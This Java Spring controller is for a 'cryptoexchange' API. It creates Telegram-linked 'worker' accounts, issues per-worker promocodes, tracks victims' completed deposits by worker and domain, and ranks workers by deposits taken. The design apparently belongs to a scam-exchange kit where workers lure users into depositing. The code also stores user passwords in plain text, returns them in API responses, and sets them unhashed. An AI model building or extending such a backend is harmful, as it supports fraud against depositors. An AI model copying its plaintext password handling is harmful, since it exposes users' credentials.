package me.yukitale.cryptoexchange.controller;

import me.yukitale.cryptoexchange.exchange.model.Coin;
import me.yukitale.cryptoexchange.exchange.model.user.User;
import me.yukitale.cryptoexchange.exchange.model.user.UserDeposit;
import me.yukitale.cryptoexchange.exchange.repository.CoinRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.UserDepositRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.UserRepository;
import me.yukitale.cryptoexchange.exchange.security.service.UserDetailsServiceImpl;
import me.yukitale.cryptoexchange.exchange.service.UserService;
import me.yukitale.cryptoexchange.panel.admin.model.other.AdminSettings;
import me.yukitale.cryptoexchange.panel.admin.repository.other.AdminSettingsRepository;
import me.yukitale.cryptoexchange.panel.common.data.WorkerTopStats;
import me.yukitale.cryptoexchange.panel.common.service.StatsService;
import me.yukitale.cryptoexchange.panel.worker.model.Promocode;
import me.yukitale.cryptoexchange.panel.worker.model.Worker;
import me.yukitale.cryptoexchange.panel.worker.repository.PromocodeRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.WorkerRepository;
import me.yukitale.cryptoexchange.panel.worker.service.WorkerService;
import me.yukitale.cryptoexchange.utils.DataValidator;
import me.yukitale.cryptoexchange.utils.DateUtil;
import me.yukitale.cryptoexchange.utils.JsonUtil;
import me.yukitale.cryptoexchange.utils.StringUtil;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.domain.PageRequest;
import org.springframework.data.domain.Pageable;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.*;

@RestController
public class ExchangeApiController {

    @Autowired
    private AdminSettingsRepository adminSettingsRepository;

    @Autowired
    private PromocodeRepository promocodeRepository;

    @Autowired
    private CoinRepository coinRepository;

    @Autowired
    private UserDepositRepository userDepositRepository;

    @Autowired
    private WorkerRepository workerRepository;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private UserService userService;

    @Autowired
    private WorkerService workerService;

    @Autowired
    private StatsService statsService;

    @Autowired
    private UserDetailsServiceImpl userDetailsService;

    @PostMapping("/api/exchange")
    public ResponseEntity<?> exchangeApi(@RequestParam(value = "api_key") String apiKey, @RequestParam(value = "action") String action, @RequestBody Map<String, Object> data) {
        Map<String, Object> answer = new HashMap<>();
        if (StringUtils.isBlank(apiKey)) {
            answer.put("error", "api_key");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        AdminSettings adminSettings = adminSettingsRepository.findFirst();
        if (StringUtils.isBlank(adminSettings.getApiKey())) {
            answer.put("error,", "api_key");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        if (!apiKey.equals(adminSettings.getApiKey())) {
            answer.put("error", "wrong_api_key");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        switch (action.toUpperCase()) {
            case "CREATE_RANDOM_WORKER" -> {
                return createRandomWorker(answer);
            }
            case "CREATE_PROMOCODE" -> {
                return createPromocode(answer, data);
            }
            case "DELETE_PROMOCODE" -> {
                return deletePromocode(answer, data);
            }
            case "GET_PROMOCODE", "GET_PROMOCODES" -> {
                return getPromocodes(answer, data);
            }
            case "GET_PROMOCODE_NAMES" -> {
                return getPromocodeNames(answer, data);
            }
            case "GET_PROMO_STATS" -> {
                return getPromoStats(answer, data);
            }
            case "GET_DEPOSITS" -> {
                return getDeposits(answer, data);
            }
            case "GET_DEPOSITS_V2" -> {
                return getDepositsV2(answer);
            }
            case "GET_STATS" -> {
                return getStats(answer, data);
            }
            case "GET_WORKER_INFO" -> {
                return getWorkerInfo(answer, data);
            }
            case "CHANGE_WORKER_INFO" -> {
                return changeWorkerInfo(answer, data);
            }
            case "CHANGE_SUPPORT_OWN" -> {
                return changeSupportOwn(answer, data);
            }
            case "GET_TOP" -> {
                return getTop(answer, data);
            }
        }

        answer.put("error", "action_not_found");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> createRandomWorker(Map<String, Object> answer) {
        String email = RandomStringUtils.random(12, true, true).toLowerCase() + "@telegram.org";
        String username = RandomStringUtils.random(8, true, true);
        String password = RandomStringUtils.random(8, true, true);
        String ip = "127.0.0.1";
        String domainName = "127.0.0.1";
        String platform = "Telegram";

        User user = userService.createUser("", null, email, username, password, domainName, platform, ip, null, -1, true);
        Worker worker = workerService.createWorker(user);

        answer.put("status", "ok");
        answer.put("email", email);
        answer.put("username", username);
        answer.put("password", password);
        answer.put("user_id", user.getId());
        answer.put("worker_id", worker.getId());

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> createPromocode(Map<String, Object> answer, Map<String, Object> body) {
        String name = String.valueOf(body.get("name"));
        if (!name.matches("^[a-zA-Z0-9-_]{2,32}$")) {
            answer.put("error", "invalid_name");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        if (promocodeRepository.existsByNameIgnoreCase(name.toLowerCase())) {
            answer.put("error", "already_exists");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        String text = String.valueOf(body.get("text"));
        if (!DataValidator.isTextValided(text) || text.length() > 512) {
            answer.put("error", "invalid_text");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        String currency = String.valueOf(body.get("currency"));
        Optional<Coin> coinOptional = coinRepository.findBySymbol(currency);
        if (coinOptional.isEmpty()) {
            answer.put("error", "currency_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        double sum = Double.parseDouble(String.valueOf(body.get("sum")));
        if (sum <= 0) {
            answer.put("error", "sum");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));
        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        if (promocodeRepository.countByWorkerId(worker.getId()) >= 50) {
            answer.put("error", "worker_promo_limit");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        Promocode promocode = new Promocode(name, text, coinOptional.get(), sum, sum, 0, worker);
        promocodeRepository.save(promocode);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> deletePromocode(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));
        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        String name = String.valueOf(body.get("name"));
        Promocode promocode = promocodeRepository.findByNameIgnoreCaseAndWorkerId(name, worker.getId()).orElse(null);
        if (promocode == null) {
            answer.put("error", "promo_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        promocodeRepository.deleteById(promocode.getId());

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getPromocodes(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));
        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        List<Promocode> promocodes = promocodeRepository.findByWorkerId(worker.getId());

        List<Map<String, Object>> promocodesList = new ArrayList<>();
        for (Promocode promocode : promocodes) {
            promocodesList.add(new HashMap<>() {{
                put("name", promocode.getName());
                put("currency", promocode.getCoin().getSymbol());
                put("sum", promocode.getMinAmount());
                put("created", StringUtil.formatDate(promocode.getCreated()));
                put("activations", promocode.getActivations());
                put("deposits", promocode.getDeposits());
                put("deposits_price", promocode.getDepositsPrice());
            }});
        }

        answer.put("promocodes", promocodesList);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getPromocodeNames(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));
        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        List<Promocode> promocodes = promocodeRepository.findByWorkerId(worker.getId());

        List<Map<String, Object>> promocodesList = new ArrayList<>();
        for (Promocode promocode : promocodes) {
            promocodesList.add(new HashMap<>() {{
                put("id", promocode.getId());
                put("name", promocode.getName());
            }});
        }

        answer.put("promocodes", promocodesList);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getPromoStats(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));
        long id = Long.parseLong(String.valueOf(body.get("id")));
        String type = (String) body.get("type");
        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        Promocode promocode = promocodeRepository.findByIdAndWorkerId(id, workerId).orElse(null);

        if (promocode == null) {
            answer.put("error", "promocode_not_found");
            return ResponseEntity.ok(answer);
        }

        Map<String, Map<String, Object>> countryStats = new LinkedHashMap<>();

        Map<String, Long> registrations;
        Map<String, Long> depositsCount;
        Map<String, Double> depositsPrices;
        Date startDate = null;
        if (type.equals("today")) {
            startDate = DateUtil.getTodayStartDate();
        } else if (type.equals("week")) {
            startDate = DateUtil.getWeekStartDate();
        } else if (type.equals("month")) {
            startDate = DateUtil.getMonthStartDate();
        }

        if (startDate == null) {
            registrations = userRepository.findRegistrationsByPromocodeNameAsMap(promocode.getName());
            depositsCount = userDepositRepository.findDepositsCountByPromocodeNameAsMap(promocode.getName());
            depositsPrices = userDepositRepository.findDepositsPriceByPromocodeNameAsMap(promocode.getName());
        } else {
            registrations = userRepository.findRegistrationsByPromocodeNameAsMap(promocode.getName(), startDate);
            depositsCount = userDepositRepository.findDepositsCountByPromocodeNameAsMap(promocode.getName(), startDate);
            depositsPrices = userDepositRepository.findDepositsPriceByPromocodeNameAsMap(promocode.getName(), startDate);
        }

        for (Map.Entry<String, Long> entry : registrations.entrySet()) {
            Map<String, Object> map = new HashMap<>();
            map.put("registrations", entry.getValue());
            countryStats.put(entry.getKey(), map);
        }

        for (Map.Entry<String, Long> entry : depositsCount.entrySet()) {
            Map<String, Object> map = countryStats.getOrDefault(entry.getKey(), new HashMap<>());
            map.put("deposits_count", entry.getValue());
        }

        for (Map.Entry<String, Double> entry : depositsPrices.entrySet()) {
            Map<String, Object> map = countryStats.getOrDefault(entry.getKey(), new HashMap<>());
            map.put("deposits_price", entry.getValue());
        }

        long activations = 0;
        long deposits = 0;
        double depositsPrice = 0;

        if (type.equals("today") || type.equals("week") || type.equals("month")) {
            for (Long value : registrations.values()) {
                activations += value;
            }
            for (Long value : depositsCount.values()) {
                deposits += value;
            }
            for (Double value : depositsPrices.values()) {
                depositsPrice += value;
            }
        } else {
            activations = promocode.getActivations();
            deposits = promocode.getDeposits();
            depositsPrice = promocode.getDepositsPrice();
        }

        answer.put("country_stats", countryStats);
        answer.put("name", promocode.getName());
        answer.put("currency", promocode.getCoin().getSymbol());
        answer.put("sum", promocode.getMinAmount());
        answer.put("created", StringUtil.formatDate(promocode.getCreated()));
        answer.put("activations", activations);
        answer.put("deposits", deposits);
        answer.put("deposits_price", depositsPrice);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getDepositsV2(Map<String, Object> answer) {
        List<UserDeposit> deposits = userDepositRepository.findByCompletedAndBotReceivedOrderById(true, false);

        for (UserDeposit deposit : deposits) {
            deposit.setBotReceived(true);
            userDepositRepository.save(deposit);
        }

        List<Map<String, Object>> depositsList = new ArrayList<>();

        for (UserDeposit deposit : deposits) {
            depositsList.add(new HashMap<>() {{
                put("promocode", deposit.getUser().getPromocodeName());
                put("currency", deposit.getCoinType().name());
                put("amount", deposit.getAmount());
                put("price", deposit.getPrice());
                put("date", deposit.getDate().getTime());
                put("user", deposit.getUser().getEmail());
                put("deposit_id", deposit.getId());
                put("domain", deposit.getUser().getDomain());
                put("worker_id", deposit.getWorker() == null ? -1 : deposit.getWorker().getId());
            }});
        }

        answer.put("deposits", depositsList);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getDeposits(Map<String, Object> answer, Map<String, Object> body) {
        int limit = Integer.parseInt(String.valueOf(body.get("limit")));

        Pageable pageable = PageRequest.ofSize(limit);

        List<UserDeposit> deposits = userDepositRepository.findByCompletedOrderByIdDesc(true, pageable);

        List<Map<String, Object>> depositsList = new ArrayList<>();
        for (UserDeposit deposit : deposits) {
            depositsList.add(new HashMap<>() {{
                put("promocode", deposit.getUser().getPromocodeName());
                put("currency", deposit.getCoinType().name());
                put("amount", deposit.getAmount());
                put("price", deposit.getPrice());
                put("date", deposit.getDate().getTime());
                put("user", deposit.getUser().getEmail());
                put("deposit_id", deposit.getId());
                put("domain", deposit.getUser().getDomain());
                put("worker_id", deposit.getWorker() == null ? -1 : deposit.getWorker().getId());
            }});
        }

        answer.put("deposits", depositsList);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getStats(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));

        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        answer.put("users", worker.getUsersCount());

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getWorkerInfo(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));

        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        answer.put("email", worker.getUser().getEmail());
        answer.put("username", worker.getUser().getUsername());
        answer.put("password", worker.getUser().getPassword());

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> changeWorkerInfo(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));

        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        String key = (String) body.get("key");
        String value = (String) body.get("value");

        User user = worker.getUser();
        if (key.equals("email")) {
            value = value.toLowerCase();
            if (!DataValidator.isEmailValided(value)) {
                answer.put("error", "email_not_valided");
                return ResponseEntity.ok(JsonUtil.writeJson(answer));
            }

            if (userRepository.existsByEmail(value)) {
                answer.put("error", "email_already_exists");
                return ResponseEntity.ok(JsonUtil.writeJson(answer));
            }

            userDetailsService.removeCache(user.getEmail());

            user.setEmail(value);

            userRepository.save(user);

            userDetailsService.removeCache(user.getEmail());
        } else if (key.equals("username")) {
            if (!DataValidator.isUsernameValided(value)) {
                answer.put("error", "username_not_valided");
                return ResponseEntity.ok(JsonUtil.writeJson(answer));
            }

            if (userRepository.existsByUsernameIgnoreCase(value)) {
                answer.put("error", "username_already_exists");
                return ResponseEntity.ok(JsonUtil.writeJson(answer));
            }

            user.setUsername(value);
            userRepository.save(user);

            userDetailsService.removeCache(user.getEmail());
        } else {
            if (value.length() < 8 || value.length() > 64) {
                answer.put("error", "password_not_valided");
                return ResponseEntity.ok(JsonUtil.writeJson(answer));
            }

            user.setPassword(value);
            userRepository.save(user);

            userDetailsService.removeCache(user.getEmail());
        }

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> changeSupportOwn(Map<String, Object> answer, Map<String, Object> body) {
        long workerId = Long.parseLong(String.valueOf(body.get("worker_id")));

        Worker worker = workerRepository.findById(workerId).orElse(null);
        if (worker == null) {
            answer.put("error", "worker_not_found");
            return ResponseEntity.ok(JsonUtil.writeJson(answer));
        }

        boolean supportOwn = Boolean.parseBoolean(String.valueOf(body.get("support_own")));

        worker.setSupportOwn(supportOwn);

        workerRepository.save(worker);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }

    private ResponseEntity<?> getTop(Map<String, Object> answer, Map<String, Object> body) {
        String typeString = (String) body.get("type");

        WorkerTopStats.Type type = WorkerTopStats.Type.valueOf(typeString.toUpperCase());

        List<WorkerTopStats> topStatsList = statsService.getAllWorkerStats(type);

        List<Map<String, Object>> list = new ArrayList<>();

        for (int i = 0; i < Math.min(10, topStatsList.size()); i++) {
            WorkerTopStats topStats = topStatsList.get(i);

            Map<String, Object> map = new HashMap<>();
            map.put("worker_id", topStats.getWorker().getId());
            map.put("username", topStats.getWorker().getUser().getEmail());
            map.put("deposits_count", topStats.getDepositsCount());
            map.put("deposits_price", topStats.getDepositsPrice().getValue());
            map.put("users_count", topStats.getUsersCount());

            list.add(map);
        }

        answer.put("top", list);

        answer.put("status", "ok");

        return ResponseEntity.ok(JsonUtil.writeJson(answer));
    }
}
